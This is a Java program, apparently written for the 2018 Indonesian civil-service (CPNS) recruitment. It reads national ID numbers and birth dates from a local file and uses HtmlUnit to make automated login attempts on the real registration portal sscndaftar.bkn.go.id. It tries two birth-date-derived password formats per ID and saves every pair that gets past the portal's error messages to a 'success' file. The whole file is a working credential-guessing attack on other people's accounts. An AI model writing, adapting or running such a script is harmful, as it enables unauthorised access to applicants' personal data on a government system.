package fjr.cpns.kemenkeu;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

public class CekLoginParimo {
	
	BufferedReader reader = null; 
	
	PrintWriter out  = null; 
	public CekLoginParimo() {
		String content = null; 
		
		HtmlPage page1 = null;
		WebClient webClient = new WebClient();
		webClient.getCookieManager().clearCookies();
		webClient.getOptions().setJavaScriptEnabled(false);
		webClient.getOptions().setCssEnabled(false);
		try {
			out = new PrintWriter(new FileOutputStream("E:/birokrasi/lamaran kerja/CPNS 2018/pengumuman/kementerian keuangan/sukses - 1.txt")); 
			reader = new BufferedReader(new FileReader("E:/birokrasi/lamaran kerja/CPNS 2018/pengumuman/kementerian keuangan/hasil_login.txt"));
			while((content = reader.readLine() ) != null) {		
				String[] temp = content.split("\\|"); 
				if( temp.length == 3) {
					page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
					String nik = temp[0];
					String old_tanggal = temp[1]; 
					
					String[] temp_tanggal = old_tanggal.split("\\/"); 
					String new_tanggal = temp_tanggal[1].concat(temp_tanggal[0].concat(temp_tanggal[2])); 
					
					HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
					HtmlInput name = form.getInputByName("username"); 

					name.setValueAttribute(nik); 
					HtmlInput passwordForm = form.getInputByName("password"); 
					passwordForm.setValueAttribute(new_tanggal); 
					HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
					HtmlPage page2 = button.click();
					String result = page2.asText(); 
					if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
							! result.toLowerCase().contains("bad credential") &&  ! result.toLowerCase().contains("resume pendaftaran")) {
						out.println(nik + "|" + new_tanggal);  
						out.flush();
						continue; 
					}
					
					new_tanggal =  temp_tanggal[1].concat(temp_tanggal[0].concat(temp_tanggal[2].substring(2))); 
					page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
					
					form = (HtmlForm) page1.getElementById("FormLogin"); 
					name = form.getInputByName("username"); 

					name.setValueAttribute(nik); 
					passwordForm = form.getInputByName("password"); 
					passwordForm.setValueAttribute(new_tanggal); 
					button = (HtmlButton) page1.getElementById("btnSimpan"); 
					page2 = button.click();
					result = page2.asText(); 
					if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
							! result.toLowerCase().contains("bad credential") &&  ! result.toLowerCase().contains("resume pendaftaran")) {
						out.println(nik + "|" + new_tanggal);  
						out.flush();
						continue; 
					}					
				}
			}
		}catch(Exception e) {
			e.printStackTrace();
		}
		
		System.out.println("FINISH"); 
	}

	public static void main(String[] args) {
		new CekLoginParimo(); 
	}
}
